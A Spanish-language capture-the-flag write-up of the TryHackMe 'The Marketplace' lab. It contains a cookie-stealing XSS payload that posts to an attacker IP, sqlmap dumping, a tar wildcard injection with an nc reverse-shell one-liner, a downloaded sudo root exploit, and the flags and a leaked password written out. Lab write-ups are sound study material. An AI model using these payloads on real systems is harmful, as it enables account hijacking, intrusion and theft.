@@ -1,0 +1,200 @@
+>>>TryHackMe
+>>The market
+
+>nmap
+
+>nmap -p- -sS -sC -sV  --min-rate 5000 -n -Pn 10.10.88.192 -oN nmap
+
+•22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+•80/tcp open  http    nginx 1.19.2
+| http-robots.txt: 1 disallowed entry 
+|_/admin
+
+
+>fuzz
+
+>gobuster dir -u 10.10.179.31 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+
+•/images               
+•/new                  
+•/login                     
+•/signup                      
+•/admin                  
+•/messages 
+
+Al ingresar a la pagina, por el puerto 80 vemos que es una especie de marketplace. Donde tenemos algunas opciones, entre las destacables encontramos:
+
+•login
+•Contact the listing author
+•Report listing to admins
+
+Procederemos a testear varias cosas. Dado que es un marketplace veremos si en los inputs se puede ejecutar XSS y SQLI, si esto no da resultados intentaremos por la via de la fuerza bruta.
+
+El login parece estar bien sanitizado. Procederemos a crear una cuenta para asi seguir interactuando.
+
+>user:max
+>pass:666
+
+Ahora encontramos 2 nuevas opciones
+
+•new listing
+•messages
+
+Procederemos a testear ambas. Vemos que la upcion de "new listing" nos permite crear un nuevo anuncio, pero tenemos bloqueada la opcion de uplodear imagenes. 
+
+Luego de varios intentos, vemos que esta opcion es vulnerable a XSS
+
+Parametros utilizados:
+
+•<h1>hola</h1> 
+**uno de los indicios de que el input no esta bien sanitizado es el poder introducir peticiones html, como <h1>
+
+•<script>alert(1)</script>
+
+Luego de investigar opciones, vemos que la opcion de "Report listing to admins" nos entrega el siguiente mensaje
+
+>From system
+Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace!
+
+Por lo que parece, el reporte lo vera un administrador. Si un administrador ve nuestra publicacion infectada con un payload malicioso podriamos acceder a su cookie de sesion y pasar a tener una cuenta de admin.
+**Para que esto funcione, necesitamos corrovorar antes que la opcion "http-only" este en false**
+
+Procedemos a buscar en internet algun payload que nos de la cookie del admin.
+
+>https://github.com/Grizzy529/XSS-cookie-stealer.py/blob/main/cookie-stealer.py
+
+Ahi hemos encontrado un script en python2, el cual ejecuta un servidor en mi maquina local, y yo ganar la cookie utilizando el siguiente parametro en una entrada XSS.
+
+<script>
+  image = new Image();
+  image.src='http://10.18.112.21:8888/?'+document.cookie;
+</script>
+
+Al enviar el payload, recibimos una nueva cookie. 
+
+>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDMwMTM4MTh9.9WcFFiY9mttpSI45tAiYBZ5MxktMMo4a91MIfQ6l68A
+
+>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3MDMwMTcyODF9.512GZI3OCg7wdKuu92I-0Z2Kb3LYze8wcLg7yL4sf-M
+
+Esta la pegamos dentro de storage>cookies>value='nueva cookie'
+
+Refrescamos la pagina y ahora tenemos un login dea dmin
+
+>You're already logged in as michael. 
+
+Ahora tenemos una nueva opcion llamada "administration panel" Donde encontramos una flag
+
+>flag1:
+THM{c37a63895910e478f28669b048c348d5}
+
+Vemos otros usuarios:
+
+•system(id:1)
+•michael(admin)(id:2)
+•jake(admin)(id:3)
+•max
+
+Al ingresar dentro de alguno de los usuarios, vemos que en el buscador aparece lo siguiente
+
+>http://10.10.179.31/admin?user=2
+
+Probaremos ver SQLinjection
+
+>http://10.10.179.31/admin?user='
+•Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+
+Este error nos hace notar que en efecto es vulnerable a SQLInjection, asi que procederemos a utilizar SQLMap
+
+Primero, interceptaremos la peticion con burpsuite. Ahora utilizaremos SQLMap
+
+>sqlmap -r sql --delay=2 --dump --technique=U --dbms=mysql
+
+Encontramos el siguiente mensaje almacenado en la base de datos
+
+>| 1  | 1       | 3       | 1         | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ 
+
+Ahora ingresamos por el puerto ssh como jake e ingresamos exitosamente.
+
+>ssh jake@10.10.143.169
+>pass: @b_ENXkGYUCAv3zJ
+
+Ya como jake comenzamos a buscar como escalar privilegios.
+
+>sudo -l
+•(michael) NOPASSWD: /opt/backups/backup.sh
+
+Vemos que podemos pasar a michael a traves de ese script en bash.
+
+>cat /opt/backups/backup.sh 
+#!/bin/bash
+echo "Backing up files...";
+tar cf /opt/backups/backup.tar *
+
+Vemos que este script ejecuta "/backup.tar *" asi que buscamos en internet como ejecutar ese script para cambiar de usuario
+Encontramos lo siguiente:
+
+
+> cd /opt/backups
+
+Dentro de la carpeta ejecutamos los siguientes codigos.
+
+> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.112.21 443 >/tmp/f" > shell.sh
+> echo "" > "--checkpoint-action=exec=sh shell.sh"
+> echo "" > --checkpoint=1
+**esto crea carpetas con esos nombres los cuales ejecutaran comandos apuntados para ganar privilegios**
+
+Ahora tenemos que eliminar el script "backup.tar" porque genera error al ejecutar el comando
+
+> rm backup.tar
+
+Ahora ejecutamos como "michael"
+
+> sudo -u michael /opt/backups/backup.sh
+
+Procedemos a ponernos en escucha con netcat
+
+>nc -nlvp 443
+
+Y ya recivimos una reverseshell como "michael"
+
+Creamos una bash mas comoda para trabajar
+
+>script /dev/null -c bash
+>control+z
+>stty raw -echo; fg
+>reset xterm
+>export TERM=xterm
+>export SHELL=bash
+
+Ya como michael vemos como escalar privilegios. 
+
+> sudo -V 
+•Sudo version 1.8.21p2
+
+Vemos que es vulnerable a un exploit que ya teniamos guardado de anteriores ataques. "CVE-2021-3156"
+
+Para ejecutarlo, primero creamos un servidor en python 
+
+>python3 -m http.server 8080
+
+Luego, nos vamos a la carpeta donde tenemos privilegios de escritura "/tmp" y extraeremos el archivo necesario para ejecutar el script
+
+>cd /tmp
+>wget 10.18.112.21:8080/exploit_nss.py
+>python3 exploit_nss.py
+# whoami
+root
+
+Como root nos ejecutamos una bash y buscamos las flags
+
+# bash
+root@the-marketplace:/tmp# find / -name root.txt 2>/dev/null
+/root/root.txt
+root@the-marketplace:/tmp# cat /root/root.txt
+THM{d4f76179c80c0dcf46e0f8e43c9abd62}
+root@the-marketplace:/tmp# find / -name user.txt 2>/dev/null
+/home/jake/user.txt
+root@the-marketplace:/tmp# cat /home/jake/user.txt
+THM{c3648ee7af1369676e3e4b15da6dc0b4}
+
+
